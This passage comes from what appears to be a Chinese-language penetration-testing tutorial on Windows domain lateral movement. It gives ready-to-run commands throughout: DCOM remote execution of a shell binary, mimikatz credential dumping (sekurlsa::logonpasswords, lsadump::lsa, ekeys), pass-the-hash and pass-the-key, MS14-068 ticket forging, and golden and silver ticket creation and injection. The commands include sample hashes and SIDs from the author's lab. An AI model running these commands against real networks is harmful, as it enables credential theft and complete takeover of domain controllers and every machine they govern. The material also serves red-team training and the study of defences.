    $com = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","192.168.52.138"))
    $com.DisplayAlerts = $false
    # 然后执行如下命令，我们就可以调用该对象的"DDEInitiate"方法在远程主机上启动进程
    $com.DDEInitiate("cmd.exe","/c C:\shell.exe")
这里就不再列举其他方法了，这一部分因为知识储备的问题很多都是借鉴大佬们的思想，这里WHOAMI师傅介绍的`DCOM横向移动`十分详细，师傅们请移步：
[如何利用 DCOM 进行内网横向渗透](https://xz.aliyun.com/t/9691)
## PTH(pass the hash)
`pass-the-hash`在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过`LM Hash`和`NTLM
Hash`访问远程主机或服务，而不用提供明文密码。
`pass the hash`原理：
  * 在Windows系统中，通常会使用NTLM身份认证
  * NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)
  * hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash
  * 如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)
这类攻击适用于：
  * 域/工作组环境
  * 可以获得hash，但是条件不允许对hash爆破
  * 内网中存在和当前机器相同的密码
微软也对`pth`打过补丁，然而在测试中发现，在打了补丁后，常规的`Pass The Hash`已经无法成功，唯独默认的`Administrator(SID
500)`账号例外，利用这个账号仍可以进行`Pass The Hash`远程ipc连接。
如果禁用了ntlm认证，PsExec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。
从windows到windows横向pth这一类攻击方法比较广泛。
首先使用`mimikatz`抓取域管hash，注意`mimikatz`在抓取到hash之后是不能够直接复制的，所以我们这里选择用log参数将抓取到的hash输出为txt
    mimikatz log privilege::debug sekurlsa::logonpasswords
使用`mimikatz` hash传递
    sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ea7937eec9ab52e6cc9528a2011ca1d8
## PTT(pass the ticket)
`PTH`部分基于`NTLM`认证进行攻击，而`PTT`基于`kerberos`协议进行攻击
`PTT`中最常见的三种攻击方式为：MS14-068、黄金票据、白银票据
### MS14-068
`MS14-068`是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于`kdcsvc.dll`域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos
TGT来获得票证。
`MS14-068`对应的补丁为`KB3011780`，接下来说一下`MS14-068`的利用过程
### 利用mimikatz ptt
1.获取普通域成员的SID
2.生成TGT票据
    ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码
    MS14-068.exe -u PI:EMAIL -s S-1-5-21-652679085-3170934373-4288938398-1107 -d 192.168.10.5 -p 
在同目录下生成了`.ccache`文件
3.票据注入
使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器
通过mimikatz进行票据注入
    mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
    mimikatz # kerberos::list          //查看当前机器凭证
    mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中
4.klist查看缓存票据
5.建立ipc连接
可以看到我们这里已经提升到dc权限，这里需要注意一个问题，如果要使用psexec或者wmi进行远程执行命令的操作，这里的ip就要换成主机名字，否则无法登录成功
### 利用kekeo ptt
这里使用到不用管理员权限进行ptt，使用到kekeo
1.生成票据
    kekeo "tgt::ask /user:mars2 /domain:Drunkmars.com /ntlm:ea7937eec9ab52e6cc9528a2011ca1d8
2.导入票据
    kerberos::ptt PI:EMAIL_krbtgt~PI:EMAIL
3.查看票据并访问域控
### Golden ticket
> `Golden
> ticket`的作用是可以生成任意用户的tgt,那么问题就来了,是什么条件能够让他生成任意用户的tgt呢？还得要看kerberos认证的过程,在windows认证过程中，客户端将自己的信息发送给KDC,然后KDC使用krbtgt用户密码的hash作为密钥进行加密，生成TGT。
那么如果获取到了`krbtgt`的密码hash值，就可以伪造任意tgt了。
**因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门**
伪造黄金凭据需要具备下面条件：
  * krbtgt用户的hash(就意味着你已经有域控制器权限了)
  * 域名称
  * 域的SID值
  * 要伪造的用户名
先登录域控制器，dump krbtgt用户的hash值,获取域sid
    privilege::debug
    lsadump::lsa /patch
登录普通域用户生成TGT凭证
    kerberos::golden /user:administrator /domain:Drunkmars.com /sid:S-1-5-21-652679085-3170934373-4288938398-1107 /krbtgt:c1833c0783cfd81d3548dd89b017c99a /ticket:gold.kirbi
注入黄金票据并访问域控
    kerberos::ptt gold.kirbi
如果开启`rpc服务`则可以用`winexec.vbs`直接连接，这里我的域控没有开启`rpc服务`，所以这里连接没有成功
### Sliver ticket
`Sliver ticket`和`golden
ticket`不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。
不像是`Golden ticket`，是由krgtgt用户的密码hash进行加密，伪造tgt可以获取到所有权限。
白银票据这里只是对单一的服务进行授权，利用过程和`golden ticket`差不多，首先上域控制器中，把机器的ntlm hash(rc4加密)
dump下来,然后在普通域用户机器进行伪造权限,进行ptt。
登录DC，抓取ntlm hash
    mimikatz log privilege::debug sekurlsa::logonpasswords
在普通域用户中生成票据
    kerberos::golden /domain:Drunkmars.com /sid:S-1-5-21-652679085-3170934373-4288938398 /target:WIN-M836NN6NU8B.Drunkmars.com /service:cifs /rc4:7c64e7ebf46b9515c56b2dd522d21c1c /user:administrator /ptt
****
查看票证访问域控
## PTK(pass the key)
在连接配置的时候允许使用hash进行认证，而不是只有账号密码才能认证。
就是由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。其中，如果hash的ntlm
hash，然后加密方式是rc4，这种就算做是pass the hash，如果是hash是aes
key(使用sekurlsa::ekeys导出来)，就算是pass the key。在很多地方，不支持rc4加密方式的时候，使用pass the
key不失为一种好方法。
获取aes key
    mimikatz log privilege::debug sekurlsa::ekeys
注入aes key
    mimikatz "privilege::debug" "sekurlsa::pth /user:mars2 /domain:Drunkmars.com /aes256:a207497d6c9df363b6658271ac0df1862c395d6b32003a5207dde3803f7dae0d"
## 后记
作为一个小白，能够总结出来的横向移动都是一些很常规的方法，很多知识都是借鉴了大佬们的思想，等于说是站在巨人的肩膀上才总结出了这篇文章，在这里对提供思路的大佬们表示衷心的感谢。如果文章中有什么勘误，还请师傅们斧正。